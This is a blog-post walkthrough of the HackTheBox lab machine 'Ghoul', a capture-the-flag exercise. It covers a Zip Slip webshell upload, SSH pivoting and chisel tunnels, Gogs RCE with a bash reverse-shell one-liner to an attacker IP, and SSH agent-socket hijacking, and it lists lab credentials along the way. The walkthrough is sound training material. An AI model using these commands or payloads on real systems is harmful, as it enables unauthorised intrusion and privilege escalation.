---
title: "HackTheBox - WriteUp 12"
date: 2019-07-08T13:16:37+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Ghoul 

Initial Scan: 22 Port for SSH, 2222 Port for SSH(Inaccessible from outside), 80 (Apache), 8080 (Tomcat 7.0.88 + Coyote).

## User

Tomcat has a CVE-2017-12617, however, it only works before 7.0.81, so useless.

Access Port 8080, using a weak password as your credentials: `admin:admin`, After that, you should go through the whole page and click each button you can click to get the information. Here, as you know, a Tomcat means Java Web Application. After you click the right button of the banner, you will see a ZIP upload form.

Check here before continue: https://snyk.io/research/zip-slip-vulnerability

so find a place in `/var/www/html` (default directory of webroot with Apache), and place your PHP trojan here, `zip tstsh.zip ../../../../../../../var/www/html/trjyg7.php`, zip will allow this absolute to be put into an archive file. Then upload to the site an access it via port 80 with `http://10.10.10.101/trjyg7.php`.

In your webshell, download the following files:

- /var/backups/backups/*.backup 
- /var/www/html/secret.php

The files in first, is SSH Private keys with passphrase. The second file is gonna tell you the passphrase as `ILoveTouka`.

After this step, you've already got user access with `/home/kaneki/user.txt`.

Check the Tomcat config, you'll find a commented credentials: `admin:test@aogiri123`.

Check the other two private keys, you just get the info that kaneki is the administrator here.

## Root

### Internal network scanning

Clone this repo as part of your toolsets: https://github.com/andrew-d/static-binaries

Upload nmap to the box, scan the box `Aogori 172.20.0.10(22, 2222 For SSH, 80 For HTTP, 8080 For Tomcat)` in a /24, you'll find that you're in a Docker container. Found another machine called `kaneki-pc 172.20.0.150+172.18.0.200 (22 For SSH)`, then nmap again found `172.18.0.2(22 For SSH + 3000 For Gogs)`.

Login into kaneki-pc with kaneki_pub using the same private key and passphrase. Inside the home, `/home/kaneki_pub/to-do.txt` tells you git username `AogiriTest`, password is the one we just found `test@aogiri123`, PLEASE KEEP IN MIND: THE USERNAME IS CASE-SENSETIVE HERE!

### Pivoting to GOGS

Go here to build a tunnel:  https://github.com/jpillora/chisel

`./chisel client 10.10.16.118:23033 R:6672:172.18.0.2:3000` on `kaneki-pc`,
`./chisel server -p 23033 --reverse -v` on your local machine.

You have this forward chain, access `localhost:6672`, you should can access gogs with http.

#### What if SSH?

`ssh -i kaneki.backup -L 4455:localhost:23011 kaneki@10.10.10.101` -> `ssh -L 23011:localhost:23111 kaneki_pub@172.20.0.150` -> `ssh -L 23111:172.18.0.2:3000 kaneki_pub@127.0.0.1`  That works perfectly!

So the whole procedure is: `10.10.16.118:4455 -> 10.10.10.101:23011 -> 172.20.0.150:23111 -> 172.18.0.2:3000`

Check here for reference: https://superuser.com/questions/96489/an-ssh-tunnel-via-multiple-hops

### GOGS RCE

There's 2 CVE here, 2018-18925(Fixed in 0.11.79), 2018-20303(Fixed in 0.11.86). The installed version is 0.11.66.0916.

Clone this repo: https://github.com/TheZ3ro/gogsownz

Run `nc -lvp 44044` then `python3 gogsownz.py http://localhost:4455/ -n i_like_gogits -C "AogiriTest:test@aogiri123" --rce "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.12.168/44044 0>&1'"`, you will get a reverse shell as git user.

Since `git` shell is `/bin/bash`, you just need to run LinEnum here. Check the `s6-supervise` and `s6-svscan`, you will learn it use `gosu` to run service on root.

Run a web server on kaneki-pc with webroot `~/.ssh` then directly `wget http://172.18.0.200:8080/authorized_keys` then disconnect the reverse shell and change to SSH shell with `ssh git@172.18.0.2` Then `gosu 0:0 /bin/bash`, you have the root of the GOGS docker. Download the files in the home, a `aogori-chat.7z` and `session.sh`.

Unarchive this 7-zip file, `grep -n password ./*`, you will find a password. But it's a git repository, and from `git log` you can see someone may mistakenly commits the high-privileged password. But it is `git reset --hard` -ed, so `git show ORIG_HEAD`, you will get a password: `7^Grc%C\7xEQ?tb4`, use this password to `su root` on `kaneki-pc`. It works.

Reference:  https://stackoverflow.com/questions/964876/head-and-orig-head-in-git

## Get actual root

Reference:  http://blog.7elements.co.uk/2012/04/ssh-agent-abusing-trust-part-1.html?m=1

On `kaneki-pc`, after `su root` you will find `/root/root.txt` which tells you progress is still not 100% XD. Run `pspy64 -f -r /tmp` with root permission, and wait for about 5 mins. You will notice a process: `ssh -p2222 -t root@172.18.0.1 ./log.sh` and with a file created like that `/tmp/ssh-blahblah/agent.1234`. So save the below as a script file. You only have 50 seconds here each round.

My script attached here:

```bash
#!/bin/bash

SOCKKEY=$1
SOCKPID=$2

export SSH_AUTH_SOCK=/tmp/ssh-$SOCKKEY/agent.$SOCKPID
ssh -p2222 root@172.18.0.1
```

Then after you get the notification again, run `./runroot.sh blahblah 1234`, you will get a SSH connection to physical host of the machine. There's a real `/root/root.txt`.

> This process can be automated if you edit your `/etc/ssh/ssh_config`, 
> Works like that:

```
Host *
  ControlPath /tmp/%r@%h:%p
  ControlMaster auto
  ControlPersist Yes
```

> Then: `ssh -O check -S /tmp/root\@172.18.0.1\:2222 %h`, 
> Then: `ssh -S /tmp/root\@172.18.0.1\:2222 %h`, 
> You will have the session.

I personally prefer the scripting way instead of editing config...

(END)

